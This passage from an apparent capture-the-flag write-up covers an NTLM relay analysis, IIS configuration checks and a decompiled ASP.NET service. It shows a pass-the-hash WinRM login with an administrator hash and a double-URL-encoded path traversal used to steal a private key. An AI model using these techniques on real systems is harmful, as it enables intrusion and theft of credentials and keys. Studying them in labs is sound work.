000000e0: 1a00 6700 6800 6f00 7300 7400 6c00 6900  ..g.h.o.s.t.l.i.
000000f0: 6e00 6b00 2e00 6800 7400 6200 0700 0800  n.k...h.t.b.....
00000100: cf91 526f 7942 dd01 0000 0000            ..RoyB......
```

This is the NTLM Type 2 (Challenge) message. The key field is the 8-byte server challenge (nonce) at offset 0x18 (`a7b6 29a3 1f8c 139e`). It also carries the target name (`GHOSTLINK`) and a block of target info describing the server, including the NetBIOS domain (`GHOSTLINK`), NetBIOS computer name (`GPZ-OP26-SECURE`), DNS domain (`ghostlink.htb`), DNS computer name (`gpz-op26-secure.ghostlink.htb`), and a timestamp (`cf91 526f 7942 dd01`, which is 2026-09-12 05:42:01 UTC).

The client responds:

```http
GET /certsrv/certfnsh.asp HTTP/1.1
Host: gpz-op26-secure.ghostlink.htb
Accept-Encoding: identity
Authorization: NTLM TlRMTVNTUAADAAAAGAAYAHwAAACIAYgBlAAAABIAEgBYAAAACgAKAGoAAAAIAAgAdAAAABAAEAAcAgAAFYKI4goA9GUAAAAPwtHf1IwP1FEE6+Qxoj/GZ0cASABPAFMAVABMAEkATgBLAEQAQwAwADEAJABEAEMAMAAxAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABVzMb3DAA5go7syuabeB+EBAQAAAAAAAM+RUm95Qt0BGtGvQqCvMW4AAAAAAgASAEcASABPAFMAVABMAEkATgBLAAEAHgBHAFAAWgAtAE8AUAAyADYALQBTAEUAQwBVAFIARQAEABoAZwBoAG8AcwB0AGwAaQBuAGsALgBoAHQAYgADADoAZwBwAHoALQBvAHAAMgA2AC0AcwBlAGMAdQByAGUALgBnAGgAbwBzAHQAbABpAG4AawAuAGgAdABiAAUAGgBnAGgAbwBzAHQAbABpAG4AawAuAGgAdABiAAcACADPkVJveULdAQYABAACAAAACABQAFAAAAAAAAAAAAAAAABAAAAZIET5YoxlOG94SPECFaE2lv7TpJbtzli9mJXHseP5x56m4LVrH8MS8IZkHt6iK+J/JV9ONEGv4rirC8QxkAMdCgAQAAAAAAAAAAAAAAAAAAAAAAAJACIAYwBpAGYAcwAvADEAMAAuADEAMAAuADEANQAuADEANgA5AAAAAAAAAAAAo/ZVQji4QCn3s/mJ16Zg0Q==
```

This decodes to:

```console
oxdf@hacky$ echo TlRMTVNTUAADAAAAGAAYAHwAAACIAYgBlAAAABIAEgBYAAAACgAKAGoAAAAIAAgAdAAAABAAEAAcAgAAFYKI4goA9GUAAAAPwtHf1IwP1FEE6+Qxoj/GZ0cASABPAFMAVABMAEkATgBLAEQAQwAwADEAJABEAEMAMAAxAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABVzMb3DAA5go7syuabeB+EBAQAAAAAAAM+RUm95Qt0BGtGvQqCvMW4AAAAAAgASAEcASABPAFMAVABMAEkATgBLAAEAHgBHAFAAWgAtAE8AUAAyADYALQBTAEUAQwBVAFIARQAEABoAZwBoAG8AcwB0AGwAaQBuAGsALgBoAHQAYgADADoAZwBwAHoALQBvAHAAMgA2AC0AcwBlAGMAdQByAGUALgBnAGgAbwBzAHQAbABpAG4AawAuAGgAdABiAAUAGgBnAGgAbwBzAHQAbABpAG4AawAuAGgAdABiAAcACADPkVJveULdAQYABAACAAAACABQAFAAAAAAAAAAAAAAAABAAAAZIET5YoxlOG94SPECFaE2lv7TpJbtzli9mJXHseP5x56m4LVrH8MS8IZkHt6iK+J/JV9ONEGv4rirC8QxkAMdCgAQAAAAAAAAAAAAAAAAAAAAAAAJACIAYwBpAGYAcwAvADEAMAAuADEAMAAuADEANQAuADEANgA5AAAAAAAAAAAAo/ZVQji4QCn3s/mJ16Zg0Q== | base64 -d | xxd
00000000: 4e54 4c4d 5353 5000 0300 0000 1800 1800  NTLMSSP.........
00000010: 7c00 0000 8801 8801 9400 0000 1200 1200  |...............
00000020: 5800 0000 0a00 0a00 6a00 0000 0800 0800  X.......j.......
00000030: 7400 0000 1000 1000 1c02 0000 1582 88e2  t...............
00000040: 0a00 f465 0000 000f c2d1 dfd4 8c0f d451  ...e...........Q
00000050: 04eb e431 a23f c667 4700 4800 4f00 5300  ...1.?.gG.H.O.S.
00000060: 5400 4c00 4900 4e00 4b00 4400 4300 3000  T.L.I.N.K.D.C.0.
00000070: 3100 2400 4400 4300 3000 3100 0000 0000  1.$.D.C.0.1.....
00000080: 0000 0000 0000 0000 0000 0000 0000 0000  ................
00000090: 0000 0000 1573 31bd c300 0e60 a3bb 32b9  .....s1....`..2.
000000a0: a6de 07e1 0101 0000 0000 0000 cf91 526f  ..............Ro
000000b0: 7942 dd01 1ad1 af42 a0af 316e 0000 0000  yB.....B..1n....
000000c0: 0200 1200 4700 4800 4f00 5300 5400 4c00  ....G.H.O.S.T.L.
000000d0: 4900 4e00 4b00 0100 1e00 4700 5000 5a00  I.N.K.....G.P.Z.
000000e0: 2d00 4f00 5000 3200 3600 2d00 5300 4500  -.O.P.2.6.-.S.E.
000000f0: 4300 5500 5200 4500 0400 1a00 6700 6800  C.U.R.E.....g.h.
00000100: 6f00 7300 7400 6c00 6900 6e00 6b00 2e00  o.s.t.l.i.n.k...
00000110: 6800 7400 6200 0300 3a00 6700 7000 7a00  h.t.b...:.g.p.z.
00000120: 2d00 6f00 7000 3200 3600 2d00 7300 6500  -.o.p.2.6.-.s.e.
00000130: 6300 7500 7200 6500 2e00 6700 6800 6f00  c.u.r.e...g.h.o.
00000140: 7300 7400 6c00 6900 6e00 6b00 2e00 6800  s.t.l.i.n.k...h.
00000150: 7400 6200 0500 1a00 6700 6800 6f00 7300  t.b.....g.h.o.s.
00000160: 7400 6c00 6900 6e00 6b00 2e00 6800 7400  t.l.i.n.k...h.t.
00000170: 6200 0700 0800 cf91 526f 7942 dd01 0600  b.......RoyB....
00000180: 0400 0200 0000 0800 5000 5000 0000 0000  ........P.P.....
00000190: 0000 0000 0000 0040 0000 1920 44f9 628c  .......@... D.b.
000001a0: 6538 6f78 48f1 0215 a136 96fe d3a4 96ed  e8oxH....6......
000001b0: ce58 bd98 95c7 b1e3 f9c7 9ea6 e0b5 6b1f  .X............k.
000001c0: c312 f086 641e dea2 2be2 7f25 5f4e 3441  ....d...+..%_N4A
000001d0: afe2 b8ab 0bc4 3190 031d 0a00 1000 0000  ......1.........
000001e0: 0000 0000 0000 0000 0000 0000 0000 0900  ................
000001f0: 2200 6300 6900 6600 7300 2f00 3100 3000  ".c.i.f.s./.1.0.
00000200: 2e00 3100 3000 2e00 3100 3500 2e00 3100  ..1.0...1.5...1.
00000210: 3600 3900 0000 0000 0000 0000 a3f6 5542  6.9...........UB
00000220: 38b8 4029 f7b3 f989 d7a6 60d1            8.@)......`.
```

This is the NTLM Type 3 (Authenticate) message, which carries the authenticated identity and the computed response. It contains the domain `GHOSTLINK`, the username DC01$, and the workstation DC01. It also includes the LM/NTLMv2 responses and the NTLMv2 blob (timestamp, target info, and channel-binding data). The SPN that was targeted is visible as `cifs/10.10.15.169` (my listener) at offset 0x1f0. The DC thinks it’s authenticating to `cifs/10.10.15.169`, but `ntlmrelayx` forwards that authentication to the HTTP web-enrollment endpoint instead.

In this case, the server responds 404:

```http
HTTP/1.1 404 Not Found
Transfer-Encoding: chunked
Server: Microsoft-IIS/10.0
Persistent-Auth: true
X-Powered-By: ASP.NET
Date: Sat, 12 Sep 2026 05:42:01 GMT
```

This shows that the certificate web enrollment isn’t actually there. The server must be configured to ask for auth for any page (as that’s where the secure site is hosted). When `certipy` sees it ask for auth, it assumes that it must be valid enrollment. When I do complete that auth, it then shows there’s no page there.

#### Configuration

As Administrator on the DC, I can look at the IIS configuration on the host that’s acting like a proxy. There’s a `web.config` file in `C:\inetpub\wwwroot`:

```xml
<?xml version="1.0" encoding="UTF-8"?>
<configuration>
    <system.webServer>
        <rewrite>
            <rules>
                <rule name="ReverseProxyInboundRule1" stopProcessing="true">
                    <match url="(.*)" />
                    <action type="Rewrite" url="http://172.16.20.10/{R:1}" />
                    <conditions>
                        <add input="{HTTP_HOST}" pattern="^gpz-op26-secure.ghostlink.htb$" />
                    </conditions>
                </rule>
                <rule name="ReverseProxyInboundRule2" stopProcessing="true">
                    <match url="(.*)" />
                    <action type="Rewrite" url="http://gpz-op26-toolkits.ghostlink.htb/{R:1}" />
                    <conditions>
                        <add input="{HTTP_HOST}" pattern="^gpz-op26-toolkits.ghostlink.htb$" />
                    </conditions>
                </rule>
            </rules>
        </rewrite>
    </system.webServer>
</configuration>
```

It’s taking anything with the hostname gpz-op26-secure.ghostlink.htb and routing it to 172.16.20.10, and anything with the hostname gpz-op26-toolkits.ghostlink.htb and routing it to that host by hostname. `ping` shows that that host is 172.16.20.20:

```console
evil-winrm-py PS C:\> ping gpz-op26-toolkits.ghostlink.htb

Pinging gpz-op26-toolkits.ghostlink.htb [172.16.20.20] with 32 bytes of data:
Reply from 172.16.20.20: bytes=32 time<1ms TTL=64
Reply from 172.16.20.20: bytes=32 time<1ms TTL=64
Reply from 172.16.20.20: bytes=32 time<1ms TTL=64
Reply from 172.16.20.20: bytes=32 time<1ms TTL=64

Ping statistics for 172.16.20.20:
    Packets: Sent = 4, Received = 4, Lost = 0 (0% loss),
Approximate round trip times in milli-seconds:
    Minimum = 0ms, Maximum = 0ms, Average = 0ms
```

Since I know these are VMs running on the DC, I’ll list the running VMs:

```console
evil-winrm-py PS C:\> Get-VM | Format-Table Name,State,Status,Uptime -Auto

Name                State Status             Uptime
----                ----- ------             ------
gpz-op26-secure   Running Operating normally 1.04:45:51.7000000
gpz-op26-toolkits Running Operating normally 1.04:45:50.6910000
```

There’s a complex PowerShell query to get the OS of each VM (thanks Claude):

```console
evil-winrm-py PS C:\> foreach ($vm in Get-CimInstance -Namespace root\virtualization\v2 -ClassName Msvm_ComputerSystem | ?{$_.Caption -eq 'Virtual Machine'}) { $kvp = Get-CimAssociatedInstance -InputObject $vm -ResultClassName Msvm_KvpExchangeComponent; $h = @{}; foreach ($it in $kvp.GuestIntrinsicExchangeItems) { $x = [xml]$it; $n = ($x.INSTANCE.PROPERTY | ? {$_.NAME -eq 'Name'}).VALUE; $d = ($x.INSTANCE.PROPERTY | ? {$_.NAME -eq 'Data'}).VALUE; if ($n) { $h[$n] = $d } }; "=== $($vm.ElementName) ==="; "OSName    : $($h['OSName'])"; "OSVersion : $($h['OSVersion'])"; "Kernel    : $($h['OSMajorVersion']).$($h['OSMinorVersion'])"; "FQDN      : $($h['FullyQualifiedDomainName'])" }
=== gpz-op26-toolkits ===
OSName    : Debian GNU/Linux
OSVersion : 6.12.85+deb13
Kernel    : 13.
FQDN      : getaddrinfo failed: 0xfffffffd Temporary failure in name resolution
=== gpz-op26-secure ===
OSName    : Windows Server 2025 Datacenter
OSVersion : 10.0.26100
Kernel    : 10.0
FQDN      : gpz-op26-secure.ghostlink.htb
```

The labels are a bit off for the Linux guest, where the value shown as `OSVersion` is really the kernel release. Reading the `+deb13` from it, the Gogs server is Debian 13, and the secure website is Windows Server 2025.

I’ll get a shell on the secure web server:

```console
oxdf@hacky$ proxychains evil-winrm-py -i 172.16.20.10 -u 'ghostlink.htb\administrator' -H 8190e067f478002ddd63eb209b016696
[proxychains] config file found: /etc/proxychains.conf
[proxychains] preloading /usr/lib/x86_64-linux-gnu/libproxychains.so.4
[proxychains] DLL init: proxychains-ng 4.17
          _ _            _
  _____ _(_| |_____ __ _(_)_ _  _ _ _ __ ___ _ __ _  _
 / -_\ V | | |___\ V  V | | ' \| '_| '  |___| '_ | || |
 \___|\_/|_|_|    \_/\_/|_|_||_|_| |_|_|_|  | .__/\_, |
                                            |_|   |__/  v1.6.0

[*] Connecting to '172.16.20.10:5985' as 'ghostlink.htb\administrator'
[proxychains] Strict chain  ...  127.0.0.1:1080  ...  172.16.20.10:5985  ...  OK
[proxychains] Strict chain  ...  127.0.0.1:1080  ...  172.16.20.10:5985  ...  OK
evil-winrm-py PS C:\Users\administrator.GHOSTLINK\Documents>
```

I’ll check for ADCS web enrollment:

```console
evil-winrm-py PS C:\> Get-WindowsFeature ADCS-Web-Enrollment | Format-Table Name,InstallState

Name                InstallState
----                ------------
ADCS-Web-Enrollment    Available
```

It’s not even installed! ESC8 would never have worked.

Windows authentication is enabled on every site by default:

```console
evil-winrm-py PS C:\> Get-WebConfigurationProperty -PSPath 'IIS:\Sites\Default Web Site' -Filter 'system.webServer/sec
urity/authentication/windowsAuthentication' -Name enabled

ItemXPath                   : /system.webServer/security/authentication/windowsAuthentication
IsInheritedFromDefaultValue : False
IsProtected                 : False
Name                        : enabled
TypeName                    : System.Boolean
Schema                      : Microsoft.IIs.PowerShell.Framework.ConfigurationAttributeSchema
Value                       : True
IsExtended                  : False
```

Anonymous authentication is not enabled:

```console
evil-winrm-py PS C:\> Get-WebConfigurationProperty -PSPath 'IIS:\Sites\Default Web Site' -Filter 'system.webServer/sec
urity/authentication/anonymousAuthentication' -Name enabled

ItemXPath                   : /system.webServer/security/authentication/anonymousAuthentication
IsInheritedFromDefaultValue : False
IsProtected                 : False
Name                        : enabled
TypeName                    : System.Boolean
Schema                      : Microsoft.IIs.PowerShell.Framework.ConfigurationAttributeSchema
Value                       : False
IsExtended                  : False
```

This explains why NTLM auth is required for any site on this host.

### GhostProtocolZero.dll

#### Main

I’ll take the webserver binary, `GhostProtocolZero.dll` and open it in DotPeek to take a look. There’s a single `Main` function:

![image-20260912102746180](https://pub-4caceed5c57c4466b559b0834d2806c9.r2.dev/img/image-20260912102746180.png)

The start of the function is creating the webserver:

```cs
#nullable enable
public class Program
{
  private static void \u003CMain\u003E\u0024(
  #nullable disable
  string[] args)
  {
    WebApplicationBuilder builder = WebApplication.CreateBuilder(args);
    builder.Services.Configure<FormOptions>((Action<FormOptions>) (options => options.MultipartBodyLengthLimit = 5242880L));
    WebApplication webApplication = builder.Build();
    UseExtensions.Use((IApplicationBuilder) webApplication, (Func<HttpContext, Func<Task>, Task>) (async (context, next) =>
    {
      HttpRequestRewindExtensions.EnableBuffering(context.Request);
      await next();
    }));
    if (!HostEnvironmentEnvExtensions.IsDevelopment((IHostEnvironment) webApplication.Environment))
      HstsBuilderExtensions.UseHsts((IApplicationBuilder) webApplication);
    HttpsPolicyBuilderExtensions.UseHttpsRedirection((IApplicationBuilder) webApplication);
    DefaultFilesExtensions.UseDefaultFiles((IApplicationBuilder) webApplication);
    StaticFileExtensions.UseStaticFiles((IApplicationBuilder) webApplication);
    string uploadsPath = Path.Combine(((IHostEnvironment) webApplication.Environment).ContentRootPath, "uploads");
    Directory.CreateDirectory(uploadsPath);
    string publicKeyPem = File.ReadAllText(Path.Combine(((IHostEnvironment) webApplication.Environment).ContentRootPath, "gpz-op26-pubkey.pem"));
```

There’s a key used for encryption at `gpz-op26-pubkey.pem`. It also sets up the handling of default files:

```cs
    DefaultFilesExtensions.UseDefaultFiles((IApplicationBuilder) webApplication);
    StaticFileExtensions.UseStaticFiles((IApplicationBuilder) webApplication);
```

These set the default root to `wwwroot`, which serves the static pages from there. The rest of the function is the creation of two endpoints, `/api/upload` and `/api/download`.

`/api/upload` takes uploaded files, creates a random string and uses that to create `.zip` and `.enc` filenames. It writes the uploaded files into the Zip archive, and then RSA-encrypts the zip:

```cs
   EndpointRouteBuilderExtensions.MapPost((IEndpointRouteBuilder) webApplication, "/api/upload", (Delegate) (async request =>
    {
      if (!request.HasFormContentType)
        return Results.BadRequest<string>("Invalid form");
      IFormFileCollection files = (await request.ReadFormAsync(new CancellationToken())).Files;
      if (((IReadOnlyCollection<IFormFile>) files).Count == 0)
        return Results.BadRequest<string>("No files provided");
      string hash = Convert.ToBase64String(RandomNumberGenerator.GetBytes(16)).Replace("/", "").Replace("+", "").ToLower().Substring(0, 12);
      string zipPath = Path.Combine(uploadsPath, hash + ".zip");
      string encPath = Path.Combine(uploadsPath, hash + ".enc");
      using (FileStream zipStream = new FileStream(zipPath, FileMode.Create))
      {
        using (ZipArchive archive = new ZipArchive((Stream) zipStream, ZipArchiveMode.Create))
        {
          foreach (IFormFile iformFile in (IEnumerable<IFormFile>) files)
          {
            Stream fileStream;
            using (Stream entryStream = archive.CreateEntry(iformFile.FileName, CompressionLevel.Optimal).Open())
            {
              fileStream = iformFile.OpenReadStream();
              try
              {
                await fileStream.CopyToAsync(entryStream);
              }
              finally
              {
                fileStream?.Dispose();
              }
            }
            fileStream = (Stream) null;
          }
        }
      }
      byte[] source = await File.ReadAllBytesAsync(zipPath);
      File.Delete(zipPath);
      using (RSA rsa = RSA.Create())
      {
        ((AsymmetricAlgorithm) rsa).ImportFromPem(publicKeyPem.AsSpan());
        List<byte> byteList = new List<byte>();
        int count1 = 190;
        for (int count2 = 0; count2 < source.Length; count2 += count1)
        {
          byte[] collection = rsa.Encrypt(((IEnumerable<byte>) source).Skip<byte>(count2).Take<byte>(count1).ToArray<byte>(), RSAEncryptionPadding.Pkcs1);
          byteList.AddRange((IEnumerable<byte>) collection);
        }
        await File.WriteAllBytesAsync(encPath, byteList.ToArray());
        return Results.Ok(new
        {
          link = "/api/download/" + hash + ".enc"
        });
      }
    }));
```

The loop encrypts 190 bytes at a time, but because of how RSA works, it will always emit a full block the size of the key, so each of those chunks becomes 256 bytes in the output file. On decrypt, the extra padding will be stripped away, resulting in 190 bytes of plaintext per block.

At the end it returns the link which is the path to download the new `.enc` file.

The `/api/download` function is very simple:

```cs
    EndpointRouteBuilderExtensions.MapGet((IEndpointRouteBuilder) webApplication, "/api/download/{hash}", (Delegate) (hash =>
    {
      string path2 = HttpUtility.UrlDecode(hash);
      return Results.File((Stream) File.OpenRead(Path.Combine(uploadsPath, path2)), "application/octet-stream", path2 + ".enc", new DateTimeOffset?(), (EntityTagHeaderValue) null, false);
    }));
```

#### Vulnerability

The vulnerability in the download is an arbitrary file read via path traversal, made up of two mistakes in these two lines:

```cs
string path2 = HttpUtility.UrlDecode(hash);
return Results.File((Stream) File.OpenRead(Path.Combine(uploadsPath, path2)), "application/octet-stream", path2 + ".enc", ...);
```

There’s no filtering or containment check on the given path. The user input goes straight into `Path.Combine` and then into `File.OpenRead`. Nothing validates that the resulting path is still inside `uploadsPath`.

`Path.Combine` does the same thing that Python’s `os.path.join` does (which I’ve exploited [many times before](https://0xdf.gitlab.io/tags#os-path-join)). If the later argument is rooted (either starting with `/` or a drive letter or a UNC path like `\\`), it throws away everything before it and returns the combination of that argument and what comes after. So `Path.Combine(uploadsPath, @"\\127.0.0.1\C$\Windows\win.ini")` returns the UNC path alone, with `uploadsPath` discarded. That’s why the UNC trick above works with no `..` at all.

The payload for me had to be double URL-encoded to work. By the time `hash` reaches this point in the code, the platform has already URL-decoded the route value once. This is the normal, expected decode every web framework does. This code then calls `HttpUtility.UrlDecode(hash)`, decoding it a second time.

#### Decrypt File

When I upload a file or multiple files, it gets zipped and then encrypted. I can grab the key over the directory traversal file read from above:

```console
oxdf@hacky$ proxychains wget 'http://gpz-op26-secure.ghostlink.htb/api/download/..%255cgpz-op26-pubkey.pem' -O gpz-op26-pubkey.pem
[proxychains] config file found: /etc/proxychains.conf
[proxychains] preloading /usr/lib/x86_64-linux-gnu/libproxychains.so.4
[proxychains] DLL init: proxychains-ng 4.17
--2026-09-13 04:01:07--  http://gpz-op26-secure.ghostlink.htb/api/download/..%255cgpz-op26-pubkey.pem
Resolving gpz-op26-secure.ghostlink.htb (gpz-op26-secure.ghostlink.htb)... 224.0.0.1
Connecting to gpz-op26-secure.ghostlink.htb (gpz-op26-secure.ghostlink.htb)|224.0.0.1|:80... [proxychains] Strict chain  ...  127.0.0.1:1080  ...  gpz-op26-secure.ghostlink.htb:80  ...  OK
connected.
HTTP request sent, awaiting response... 200 OK
Length: 460 [application/octet-stream]
Saving to: ‘gpz-op26-pubkey.pem’

gpz-op26-pubkey.pem               100%[============================================================>]     460  --.-KB/s    in 0s

2026-09-13 04:01:07 (23.0 MB/s) - ‘gpz-op26-pubkey.pem’ saved [460/460]
```

The website said that uploads are “encrypted at rest using the team leader’s public key”. Keypairs are always generated together, and often left in the same directory, so with the public key path from the source I can guess that there’s also a `-privkey.pem`. There is:

```console
oxdf@hacky$ proxychains wget 'http://gpz-op26-secure.ghostlink.htb/api/download/..%255cgpz-op26-privkey.pem' -O gpz-op26-privkey.pem
[proxychains] config file found: /etc/proxychains.conf
[proxychains] preloading /usr/lib/x86_64-linux-gnu/libproxychains.so.4
[proxychains] DLL init: proxychains-ng 4.17
--2026-09-13 04:12:41--  http://gpz-op26-secure.ghostlink.htb/api/download/..%255cgpz-op26-privkey.pem
Resolving gpz-op26-secure.ghostlink.htb (gpz-op26-secure.ghostlink.htb)... 224.0.0.1
Connecting to gpz-op26-secure.ghostlink.htb (gpz-op26-secure.ghostlink.htb)|224.0.0.1|:80... [proxychains] Strict chain  ...  127.0.0.1:1080  ...  gpz-op26-secure.ghostlink.htb:80  ...  OK
connected.
HTTP request sent, awaiting response... 200 OK
Length: 1702 (1.7K) [application/octet-stream]
Saving to: ‘gpz-op26-privkey.pem’

gpz-op26-privkey.pem              100%[============================================================>]   1.66K  --.-KB/s    in 0s

2026-09-13 04:12:41 (57.2 MB/s) - ‘gpz-op26-privkey.pem’ saved [1702/1702]
```

I’ll upload a couple of files:

![image-20260912160317752](https://pub-4caceed5c57c4466b559b0834d2806c9.r2.dev/img/image-20260912160317752.png)

And download the resulting file:

```console
oxdf@hacky$ proxychains wget http://gpz-op26-secure.ghostlink.htb/api/download/qykxzb8k5ulu.enc
[proxychains] config file found: /etc/proxychains.conf
[proxychains] preloading /usr/lib/x86_64-linux-gnu/libproxychains.so.4
[proxychains] DLL init: proxychains-ng 4.17
--2026-09-13 04:03:05--  http://gpz-op26-secure.ghostlink.htb/api/download/qykxzb8k5ulu.enc
Resolving gpz-op26-secure.ghostlink.htb (gpz-op26-secure.ghostlink.htb)... 224.0.0.1
Connecting to gpz-op26-secure.ghostlink.htb (gpz-op26-secure.ghostlink.htb)|224.0.0.1|:80... [proxychains] Strict chain  ...  127.0.0.1:1080  ...  gpz-op26-secure.ghostlink.htb:80  ...  OK
connected.
HTTP request sent, awaiting response... 200 OK
Length: 67328 (66K) [application/octet-stream]
Saving to: ‘qykxzb8k5ulu.enc’

qykxzb8k5ulu.enc                  100%[============================================================>]  65.75K  --.-KB/s    in 0.04s

2026-09-13 04:03:05 (1.52 MB/s) - ‘qykxzb8k5ulu.enc’ saved [67328/67328]
```

I can use Python to decrypt this. I’ll get a Python REPL with `cryptography`, and load the key and file:

```console
oxdf@hacky$ uv run --with cryptography python
Python 3.13.7 (main, Sep 18 2025, 19:47:49) [Clang 20.1.4 ] on linux
Type "help", "copyright", "credits" or "license" for more information.
>>> from cryptography.hazmat.primitives import serialization
>>> from cryptography.hazmat.primitives.asymmetric import padding
>>> with open("gpz-op26-privkey.pem", "rb") as f:
...     key = serialization.load_pem_private_key(f.read(), password=None)
...
>>> blocksize = key.key_size // 8
>>> with open("qykxzb8k5ulu.enc", "rb") as f:
...     data = f.read()
...
>>> len(data), len(data) % blocksize
(67328, 0)
```

Now I’ll loop over each block, decrypting it using the key:

```console
>>> plain = b"".join([key.decrypt(data[i:i + blocksize], padding.PKCS1v15()) for i in range(0, len(data), blocksize)])
>>> plain[:8]
b'PK\x03\x04\x14\x00\x00\x00'
```

The result starts with “PK”, the magic for a zip. I’ll write that to a file:

```console
>>> with open("qykxzb8k5ulu.zip", "wb") as f:
...     f.write(plain)
...
49955
```

It is a zip archive with the files:

```console
oxdf@hacky$ file qykxzb8k5ulu.zip
qykxzb8k5ulu.zip: Zip archive data, at least v2.0 to extract, compression method=deflate
oxdf@hacky$ unzip -l qykxzb8k5ulu.zip
Archive:  qykxzb8k5ulu.zip
  Length      Date    Time    Name
---------  ---------- -----   ----
       15  2026-09-12 21:02   text.txt
    49946  2026-09-12 21:02   0xdf.png
---------                     -------
    49961                     2 files
```

Those are the two files I uploaded, recovered from the encrypted blob.
